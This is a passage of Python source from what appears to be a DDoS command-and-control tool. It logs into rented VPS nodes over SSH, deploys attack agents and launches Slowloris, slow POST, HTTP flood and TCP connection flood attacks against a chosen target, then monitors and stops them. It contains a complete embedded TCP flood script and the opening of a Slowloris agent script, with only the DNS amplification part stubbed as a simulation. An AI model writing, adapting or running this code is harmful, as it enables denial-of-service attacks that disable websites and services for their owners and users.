                except Exception as e:
                    logger.error(f"Error getting web server info: {e}")
        
        # Scan common ports
        port_results = self.scan_ports(domain)
        results["open_ports"] = port_results["open_ports"]
        
        # Check SSL
        ssl_results = self.check_ssl(domain)
        if ssl_results["has_ssl"]:
            results["ssl_info"] = ssl_results["certificate"]
        
        # Get WHOIS information (placeholder)
        results["whois_info"] = {
            "registrar": "Example Registrar",
            "creation_date": "2020-01-01",
            "expiration_date": "2025-01-01"
        }
        
        return results

class AttackManager:
    """Manages attack operations with enhanced monitoring and control"""
    
    def __init__(self, ssh_manager, db_manager):
        """Initialize attack manager with SSH and database managers"""
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
        self.status_check_interval = 5  # seconds
        self.attack_methods = {
            'slowloris': 'Slowloris (Header Injection)',
            'slow_post': 'Slow POST (R.U.D.Y)',
            'slow_read': 'Slow Read Attack',
            'http_flood': 'HTTP Flood',
            'ssl_exhaust': 'SSL/TLS Exhaustion',
            'tcp_flood': 'TCP Connection Flood',
            'dns_amplification': 'DNS Amplification'
        }
    
    def get_available_attack_methods(self):
        """Get list of available attack methods"""
        return self.attack_methods
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters,
            'vps_status': {}
        }
        
        logger.info(f"Launching {attack_type} attack on {target_host}")
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            # Better success detection
            if success and self._is_attack_launched_successfully(output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                
                # Store VPS status in attack info
                self.active_attacks[session_id]['vps_status'][vps_ip] = {
                    'status': 'attacking',
                    'launch_time': datetime.now().isoformat(),
                    'pid': self._extract_pid(output)
                }
                
                # Verify agent is actually running
                time.sleep(2)
                verify_cmd = "ps aux | grep 'python.*agent.py' | grep -v grep | wc -l"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
                
                if verify_success and verify_output.strip() != '0':
                    print(f"  {Colors.GREEN}→ Agent verified running ({verify_output.strip()} processes){Colors.RESET}")
                else:
                    print(f"  {Colors.YELLOW}→ Warning: Agent verification failed{Colors.RESET}")
                
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                # Detailed error logging
                error_details = self._analyze_launch_error(output)
                failed_vps.append(f"{vps_ip}: {error_details}")
        
        # Update database with results
        self.db_manager.update_attack_status(
            session_id, 
            'running' if success_count > 0 else 'failed',
            {'success_count': success_count, 'failed_vps': failed_vps}
        )
        
        if success_count > 0:
            # Start monitoring thread
            self._start_monitoring_thread(session_id)
            
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            print(f"{Colors.YELLOW}[TROUBLESHOOTING TIPS]:{Colors.RESET}")
            print(f"  1. Verify VPS connections: Option 2 - Test All Connections")
            print(f"  2. Check agent deployment: Option 3 - Deploy Agents")
            print(f"  3. Test single VPS: Option 5 - Test Single VPS")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _extract_pid(self, output):
        """Extract PID from launch output"""
        pid_match = re.search(r'PID:\s*(\d+)', output)
        if pid_match:
            return pid_match.group(1)
        return None
    
    def _is_attack_launched_successfully(self, output):
        """Better detection of successful attack launch"""
        success_indicators = [
            "Attack launched with PID",
            "SLOWLORIS] Starting attack",
            "R.U.D.Y] Starting",
            "nohup: ignoring input",
            "Creating initial connections",
            "Starting Slow Read attack",
            "Starting HTTP Flood attack",
            "Starting SSL/TLS exhaustion attack"
        ]
        
        return any(indicator in output for indicator in success_indicators)
    
    def _analyze_launch_error(self, output):
        """Analyze launch error for better debugging"""
        if "Permission denied" in output:
            return "Permission denied - check SSH credentials"
        elif "No such file" in output:
            return "Agent file not found - redeploy agent"
        elif "python3: command not found" in output:
            return "Python3 not installed on VPS"
        elif "Connection refused" in output:
            return "Target refuses connections"
        elif "Traceback" in output:
            return f"Python error - {output.split('Traceback')[1][:100]}..."
        elif output.strip() == "":
            return "Command executed but no output (timeout?)"
        else:
            return f"Unknown error - {output[:150]}..."
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        """Build attack command with better error handling and security"""
        connections = max(1, parameters.get('connections', 100))
        delay = max(0, parameters.get('delay', 15))
        duration = parameters.get('duration', 0)
        requests = parameters.get('requests', 1000)  # For HTTP flood
        
        # Clean target parsing
        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Enhanced command with better logging
        cmd = "cd /tmp/slowhttp_c2 && "
        
        # Check if agent exists
        cmd += "if [ ! -f agent.py ]; then echo 'ERROR: agent.py not found'; exit 1; fi && "
        
        # Launch with nohup and proper logging
        timestamp = int(time.time())
        log_file = f"attack_{timestamp}.log"
        
        cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
        cmd += f"--connections {connections} --delay {delay} "
        
        # Add attack-specific parameters
        if attack_type == 'http_flood':
            cmd += f"--requests {requests} "
        
        if duration > 0:
            cmd += f"--duration {duration} "
        
        # Better logging and PID capture
        cmd += f"> {log_file} 2>&1 & "
        cmd += "sleep 2 && "
        cmd += "PID=$! && "
        cmd += "echo 'Attack launched with PID:' $PID && "
        cmd += "ps aux | grep 'python3.*agent.py' | grep -v grep | head -1"
        
        return cmd
    
    def _start_monitoring_thread(self, session_id):
        """Start a background thread to monitor attack status"""
        if session_id in self.monitoring_threads and self.monitoring_threads[session_id].is_alive():
            return
            
        def monitor_thread():
            logger.info(f"Starting monitoring thread for session {session_id}")
            while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
                try:
                    status = self.get_attack_status(session_id)
                    
                    # Record status in database
                    for vps_ip, vps_status in status.items():
                        self.db_manager.record_attack_result(
                            session_id,
                            vps_ip,
                            vps_status.get('active_processes', 0),
                            vps_status.get('connections', 0),
                            vps_status.get('status', 'unknown'),
                            vps_status.get('bytes_sent', 0),
                            vps_status.get('cpu_usage', None),
                            vps_status.get('memory_usage', None),
                            vps_status.get('errors', 0)
                        )
                    
                    # Check if attack is still running
                    active_vps = sum(1 for vs in status.values() if vs.get('status') == 'attacking')
                    if active_vps == 0 and len(status) > 0:
                        logger.info(f"Attack {session_id} appears to have stopped (no active VPS)")
                        self.active_attacks[session_id]['status'] = 'completed'
                        self.db_manager.update_attack_status(session_id, 'completed')
                        break
                        
                except Exception as e:
                    logger.error(f"Error in monitoring thread for session {session_id}: {str(e)}")
                
                time.sleep(self.status_check_interval)
                
            logger.info(f"Monitoring thread for session {session_id} stopped")
        
        # Start thread
        thread = threading.Thread(target=monitor_thread, daemon=True)
        thread.start()
        self.monitoring_threads[session_id] = thread
    
    def stop_attack(self, session_id):
        """Enhanced attack stopping with verification"""
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Enhanced process killing sequence
            commands = [
                "pkill -f 'python3.*agent.py' >/dev/null 2>&1 || true",
                "sleep 1",
                "pkill -9 -f 'agent.py' >/dev/null 2>&1 || true", 
                "killall python3 >/dev/null 2>&1 || true",
                "sleep 1",
                # Verify cleanup
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 >/dev/null 2>&1 || true",
                "sleep 1",
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if "wc -l" in cmd and success and output.strip().isdigit():
                    remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            elif remaining_procs is not None and remaining_procs > 0:
                print(f"{Colors.YELLOW}PARTIAL ({remaining_procs} remaining){Colors.RESET}")
                stop_count += 1  # Still count as attempt
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        # Update database
        self.db_manager.update_attack_status(
            session_id, 
            'stopped', 
            {'stopped_vps': stop_count}
        )
        
        print(f"\n{Colors.GREEN}[SUCCESS] Stop command sent to {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        """Enhanced attack status with better process detection and metrics"""
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Multiple commands to detect running processes
            commands = [
                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                "pgrep -f 'agent.py' 2>/dev/null | wc -l",
                "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l",
                # Get status file if it exists
                "cat /tmp/slowhttp_c2/status.json 2>/dev/null || echo '{}'"
            ]
            
            active_processes = 0
            established_connections = 0
            status_data = {}
            
            for i, cmd in enumerate(commands):
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success:
                    if i < 2 and output.strip().isdigit():  # Process count commands
                        active_processes = max(active_processes, int(output.strip()))
                    elif i == 2 and output.strip().isdigit():  # Network connections
                        established_connections = int(output.strip())
                    elif i == 3:  # Status file
                        try:
                            status_data = json.loads(output)
                        except:
                            status_data = {}
            
            # Get additional system info if processes are running
            cpu_usage = None
            memory_usage = None
            if active_processes > 0:
                # Get CPU usage
                cpu_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $9}'"
                success, output = self.ssh_manager.execute_command(vps_ip, cpu_cmd)
                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
                    cpu_usage = float(output.strip())
                
                # Get memory usage
                mem_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $10}'"
                success, output = self.ssh_manager.execute_command(vps_ip, mem_cmd)
                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
                    memory_usage = float(output.strip())
            
            # Combine all data
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections': established_connections,
                'connections_info': f"({established_connections} est. conns)" if established_connections > 0 else "",
                'cpu_usage': cpu_usage,
                'memory_usage': memory_usage,
                'cpu_info': f" (CPU: {cpu_usage}%)" if cpu_usage is not None else "",
                'bytes_sent': status_data.get('bytes_sent', 0),
                'errors': status_data.get('errors', 0),
                'uptime': status_data.get('uptime', 0)
            }
        
        return status
    
    def get_attack_details(self, session_id):
        """Get detailed information about an attack session"""
        if session_id not in self.active_attacks:
            # Try to get from database
            session = self.db_manager.get_attack_session(session_id)
            if not session:
                return None
            
            # Convert database row to dictionary
            attack_info = dict(session)
            
            # Parse JSON fields
            for field in ['vps_nodes', 'parameters', 'results', 'target_info']:
                if attack_info.get(field):
                    try:
                        attack_info[field] = json.loads(attack_info[field])
                    except:
                        attack_info[field] = {}
            
            return attack_info
        
        # Return active attack info
        return self.active_attacks[session_id]
    
    def launch_tcp_flood(self, session_id, target_host, target_port, vps_list, parameters):
        """Launch a TCP connection flood attack"""
        connections = parameters.get('connections', 1000)
        duration = parameters.get('duration', 0)
        
        success_count = 0
        failed_vps = []
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching TCP Connection Flood on {target_host}:{target_port}{Colors.RESET}")
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.RED}NOT CONNECTED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: Not connected")
                continue
            
            # Create TCP flood script
            tcp_script = f'''#!/usr/bin/env python3
import socket
import threading
import time
import random
import os

target_host = "{target_host}"
target_port = {target_port}
connections = {connections}
duration = {duration}
active_connections = 0
total_attempts = 0
successful = 0
failed = 0
running = True
lock = threading.Lock()

def connection_worker():
    global active_connections, total_attempts, successful, failed
    
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_host, target_port))
            
            with lock:
                active_connections += 1
                total_attempts += 1
                successful += 1
            
            # Keep connection open
            while running:
                try:
                    # Send random data occasionally to keep connection alive
                    if random.random() < 0.1:
                        s.send(os.urandom(random.randint(1, 10)))
                    time.sleep(1)
                except:
                    break
                    
            s.close()
            with lock:
                active_connections -= 1
                
        except Exception as e:
            with lock:
                total_attempts += 1
                failed += 1
            time.sleep(0.1)

# Start worker threads
threads = []
for _ in range(min(500, connections)):  # Limit concurrent threads
    t = threading.Thread(target=connection_worker)
    t.daemon = True
    t.start()
    threads.append(t)
    time.sleep(0.01)  # Small delay between thread starts

start_time = time.time()
try:
    while running:
        # Check duration
        if duration > 0 and time.time() - start_time > duration:
            running = False
            break
            
        # Print status
        print(f"Active: {active_connections}, Attempts: {total_attempts}, Success: {successful}, Failed: {failed}")
        
        # Write status to file
        with open("/tmp/slowhttp_c2/status.json", "w") as f:
            import json
            json.dump({
                "active": active_connections,
                "sent": total_attempts,
                "errors": failed,
                "bytes_sent": successful * 100,  # Estimate
                "uptime": int(time.time() - start_time),
                "timestamp": time.time()
            }, f)
            
        time.sleep(5)
except KeyboardInterrupt:
    running = False

print("Attack stopped")
'''
            
            # Transfer and execute script
            try:
                # Create temp file
                temp_file = f"/tmp/tcp_flood_{vps_ip.replace('.', '_')}.py"
                with open(temp_file, 'w') as f:
                    f.write(tcp_script)
                
                # Transfer to VPS
                sftp = self.ssh_manager.connections[vps_ip].open_sftp()
                sftp.put(temp_file, '/tmp/slowhttp_c2/tcp_flood.py')
                sftp.close()
                
                # Clean up local file
                os.remove(temp_file)
                
                # Make executable and run
                self.ssh_manager.execute_command(vps_ip, "chmod +x /tmp/slowhttp_c2/tcp_flood.py")
                success, output = self.ssh_manager.execute_command(
                    vps_ip, 
                    "cd /tmp/slowhttp_c2 && nohup python3 tcp_flood.py > tcp_flood.log 2>&1 & echo $!"
                )
                
                if success and output.strip().isdigit():
                    print(f"{Colors.GREEN}SUCCESS (PID: {output.strip()}){Colors.RESET}")
                    success_count += 1
                    
                    # Store VPS status
                    self.active_attacks[session_id]['vps_status'][vps_ip] = {
                        'status': 'attacking',
                        'launch_time': datetime.now().isoformat(),
                        'pid': output.strip()
                    }
                else:
                    print(f"{Colors.RED}FAILED{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: Failed to start script")
            
            except Exception as e:
                print(f"{Colors.RED}ERROR{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {str(e)}")
        
        # Update database
        self.db_manager.update_attack_status(
            session_id, 
            'running' if success_count > 0 else 'failed',
            {'success_count': success_count, 'failed_vps': failed_vps}
        )
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] TCP Flood launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch TCP Flood on any VPS{Colors.RESET}")
            return False
    
    def launch_dns_amplification(self, session_id, target_ip, vps_list, parameters):
        """Launch a DNS amplification attack (simulation only)"""
        # This is a placeholder for a DNS amplification attack
        # In a real implementation, this would use DNS servers to amplify traffic
        # For educational purposes, we'll just simulate it
        
        print(f"\n{Colors.YELLOW}[ATTACK] Simulating DNS Amplification attack on {target_ip}{Colors.RESET}")
        print(f"{Colors.RED}[WARNING] This is a simulated attack for educational purposes only{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Update database to show the attack is running
        self.db_manager.update_attack_status(
            session_id, 
            'running',
            {'type': 'dns_amplification_simulation'}
        )
        
        # Mark the attack as completed after a short delay
        time.sleep(5)
        
        self.db_manager.update_attack_status(
            session_id, 
            'completed',
            {'success_count': 0, 'message': 'DNS Amplification simulation completed'}
        )
        
        print(f"\n{Colors.GREEN}[SUCCESS] DNS Amplification simulation completed{Colors.RESET}")
        return True

class SSHManager:
    """Manages SSH connections with improved reliability and error handling"""
    
    def __init__(self, security_manager):
        """Initialize SSH manager with security manager for password handling"""
        self.security_manager = security_manager
        self.connections = {}
        self.connection_cache = {}  # Cache VPS credentials
        self.connection_locks = {}  # Thread locks for connection operations
        self.max_retries = 3
        self.retry_delay = 2
        self.connection_timeout = 15
        self.command_timeout = 60
        
        # Check if SSH functionality is available
        if not SSH_AVAILABLE:
            logger.warning("SSH functionality is limited due to missing paramiko module")
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=None):
        """Connect to VPS with improved error handling and retry mechanism"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko module missing)"
            
        # Create a lock for this connection if it doesn't exist
        if ip not in self.connection_locks:
            self.connection_locks[ip] = threading.Lock()
            
        with self.connection_locks[ip]:
            # Check if already connected
            if ip in self.connections and self._check_connection_alive(ip):
                return True, "Already connected"
                
            # Decrypt password
            try:
                password = self.security_manager.decrypt_password(encrypted_password)
                if not password:
                    return False, "Failed to decrypt password"
                
                # Cache credentials for auto-reconnect
                self.connection_cache[ip] = {
                    'username': username,
                    'encrypted_password': encrypted_password,
                    'port': port
                }
                
                # Try to connect with retries
                for attempt in range(self.max_retries):
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        # Connect with timeout
                        connect_timeout = timeout or self.connection_timeout
                        ssh.connect(
                            hostname=ip,
                            username=username,
                            password=password,
                            port=port,
                            timeout=connect_timeout,
                            allow_agent=False,
                            look_for_keys=False
                        )
                        
                        # Test connection with simple command
                        stdin, stdout, stderr = ssh.exec_command("echo 'Connection test'", timeout=5)
                        exit_status = stdout.channel.recv_exit_status()
                        
                        if exit_status != 0:
                            ssh.close()
                            if attempt < self.max_retries - 1:
                                time.sleep(self.retry_delay)
                                continue
                            return False, "Connection test failed"
                        
                        # Store connection
                        self.connections[ip] = ssh
                        logger.info(f"Connected to VPS: {ip}")
                        return True, "Connected successfully"
                        
                    except Exception as e:
                        if attempt < self.max_retries - 1:
                            logger.warning(f"Connection attempt {attempt+1} failed for {ip}: {str(e)}")
                            time.sleep(self.retry_delay)
                        else:
                            logger.error(f"Failed to connect to {ip} after {self.max_retries} attempts: {str(e)}")
                            return False, str(e)
                            
            except Exception as e:
                logger.error(f"Connection error for {ip}: {str(e)}")
                return False, str(e)
    
    def _check_connection_alive(self, ip):
        """Check if SSH connection is still alive with improved reliability"""
        if ip not in self.connections:
            return False
            
        try:
            transport = self.connections[ip].get_transport()
            if transport is None or not transport.is_active():
                return False
                
            # Test with a simple command
            stdin, stdout, stderr = self.connections[ip].exec_command("echo 'test'", timeout=5)
            exit_status = stdout.channel.recv_exit_status()
            return exit_status == 0
        except Exception:
            return False
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        # Close existing connection if any
        self.disconnect_vps(ip)
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        """Disconnect from VPS with proper cleanup"""
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                logger.info(f"Disconnected from VPS: {ip}")
                return True
            except Exception as e:
                logger.error(f"Error disconnecting from {ip}: {str(e)}")
        return False
    
    def execute_command(self, ip, command, timeout=None, auto_reconnect=True):
        """Execute command with auto-reconnect capability and improved error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko module missing)"
            
        # Check if connection exists, try to reconnect if not
        if ip not in self.connections or not self._check_connection_alive(ip):
            if auto_reconnect:
                logger.info(f"No active connection to {ip}, attempting reconnect...")
                success, message = self.reconnect_vps(ip)
                if not success:
                    return False, f"Reconnection failed: {message}"
            else:
                return False, "No connection to VPS"
        
        # Use lock to prevent concurrent command execution on the same connection
        with self.connection_locks.get(ip, threading.Lock()):
            try:
                # Execute command with timeout
                cmd_timeout = timeout or self.command_timeout
                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=cmd_timeout)
                
                # Wait for command completion
                exit_status = stdout.channel.recv_exit_status()
                
                # Get output and error
                output = stdout.read().decode('utf-8', errors='ignore').strip()
                error = stderr.read().decode('utf-8', errors='ignore').strip()
                
                if exit_status == 0:
                    return True, output
                else:
                    error_msg = error if error else f"Command failed with exit status {exit_status}"
                    logger.warning(f"Command failed on {ip}: {error_msg}")
                    return False, error_msg
                    
            except Exception as e:
                logger.error(f"Command execution error on {ip}: {str(e)}")
                
                # Connection might be broken, remove it
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
                
                # Try to reconnect and execute again if auto_reconnect is enabled
                if auto_reconnect:
                    logger.info(f"Command failed on {ip}, attempting reconnect and retry...")
                    success, message = self.reconnect_vps(ip)
                    if success:
                        return self.execute_command(ip, command, timeout, auto_reconnect=False)
                    else:
                        return False, f"Reconnection failed: {message}"
                
                return False, str(e)
    
    def execute_command_async(self, ip, command):
        """Execute command asynchronously without waiting for completion"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko module missing)"
            
        if ip not in self.connections or not self._check_connection_alive(ip):
            success, message = self.reconnect_vps(ip)
            if not success:
                return False, f"Reconnection failed: {message}"
        
        try:
            # Execute command without waiting for completion
            self.connections[ip].exec_command(f"nohup {command} > /dev/null 2>&1 &")
            return True, "Command launched asynchronously"
        except Exception as e:
            logger.error(f"Async command execution error on {ip}: {str(e)}")
            return False, str(e)
    
    def get_system_info(self, ip):
        """Get detailed system information from VPS"""
        if not self._check_connection_alive(ip):
            success, message = self.reconnect_vps(ip)
            if not success:
                return {}
        
        system_info = {}
        commands = {
            "os": "cat /etc/os-release | grep PRETTY_NAME | cut -d '&quot;' -f 2",
            "kernel": "uname -r",
            "cpu": "cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d ':' -f 2",
            "cpu_cores": "nproc",
            "memory": "free -m | grep Mem | awk '{print $2}'",
            "disk": "df -h / | tail -1 | awk '{print $2}'",
            "python_version": "python3 --version 2>&1 || python --version 2>&1",
            "uptime": "uptime -p",
            "hostname": "hostname",
            "network": "ip -o -4 addr show | awk '{print $2,$4}' | grep -v 'lo'",
            "load": "cat /proc/loadavg | awk '{print $1,$2,$3}'",
            "docker": "which docker > /dev/null 2>&1 && echo 'Available' || echo 'Not installed'"
        }
        
        for key, cmd in commands.items():
            success, output = self.execute_command(ip, cmd, timeout=10)
            if success:
                system_info[key] = output.strip()
            else:
                system_info[key] = "Unknown"
        
        return system_info
    
    def check_agent_status(self, ip):
        """Check if attack agent is running on VPS"""
        if not self._check_connection_alive(ip):
            success, message = self.reconnect_vps(ip)
            if not success:
                return {"status": "unknown", "error": message}
        
        # Check for running agent processes
        success, output = self.execute_command(ip, "ps aux | grep 'python.*agent.py' | grep -v grep | wc -l")
        if not success:
            return {"status": "unknown", "error": output}
        
        process_count = int(output.strip()) if output.strip().isdigit() else 0
        
        if process_count > 0:
            # Get process details
            success, details = self.execute_command(ip, "ps aux | grep 'python.*agent.py' | grep -v grep | head -1")
            
            # Check status file if it exists
            success, status_file = self.execute_command(ip, "cat /tmp/slowhttp_c2/status.json 2>/dev/null || echo '{}'")
            try:
                status_data = json.loads(status_file)
            except:
                status_data = {}
            
            return {
                "status": "running",
                "processes": process_count,
                "details": details.strip() if success else "",
                "stats": status_data
            }
        else:
            return {"status": "stopped", "processes": 0}
    
    def deploy_agent(self, ip, agent_type="standard"):
        """Deploy attack agent to VPS with improved security and error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko module missing)"
            
        # Select agent script based on type
        if agent_type == "advanced":
            agent_script = self._get_advanced_agent_script()
        else:
            agent_script = self._get_standard_agent_script()
        
        # Use proper file transfer method
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
        ]
        
        # Execute setup commands
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        # Transfer file using SFTP instead of base64 encoding
        try:
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                # Write agent script to temporary local file
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w') as f:
                    f.write(agent_script)
                
                # Upload via SFTP
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                
                # Clean up local temp file
                os.remove(temp_file)
                
                logger.info(f"Agent deployed to {ip} via SFTP")
            else:
                logger.warning(f"No SSH connection available for {ip}, using base64 fallback")
                # Fallback to base64 method if SFTP fails
                encoded_script = base64.b64encode(agent_script.encode()).decode()
                cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
                success, output = self.execute_command(ip, cmd)
                if not success:
                    return False, f"File transfer failed: {output}"
        
        except Exception as e:
            logger.error(f"SFTP transfer failed for {ip}: {str(e)}")
            # Fallback to base64 method if SFTP fails
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"File transfer failed: {output}"
        
        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -m py_compile /tmp/slowhttp_c2/agent.py",  # Compile to check syntax
            "python3 /tmp/slowhttp_c2/agent.py --help | head -5"  # Test execution
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=20)
            if not success:
                return False, f"Final step {i+1} failed: {output}"
        
        return True, "Agent deployed and tested successfully"
    
    def _get_standard_agent_script(self):
        """Get the standard agent script"""
        return '''#!/usr/bin/env python3
import socket,threading,time,sys,random,string,signal,argparse,os,logging
from urllib.parse import urlparse
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='/tmp/slowhttp_agent.log',
    filemode='a'
)
logger = logging.getLogger("SlowHTTP-Agent")

class SlowHTTPAttack:
    def __init__(self,host,port=80):
        self.host,self.port,self.conns,self.running=host,port,[],False
        self.stats={'sent':0,'errors':0,'active':0,'bytes_sent':0}
        self.lock = threading.Lock()
        self.start_time = time.time()
    
    def create_socket(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((self.host,self.port))
            return s
        except Exception as e:
            with self.lock:
                self.stats['errors']+=1
            return None
    
    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
        logger.info(f"Starting Slowloris attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        self.start_time=time.time()
        
        # Create initial connections
        logger.info("Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock=self.create_socket()
            if sock:
                try:
                    # Full HTTP request with multiple headers for maximum server load
                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                    request += f"Host: {self.host}\\r\\n"
                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
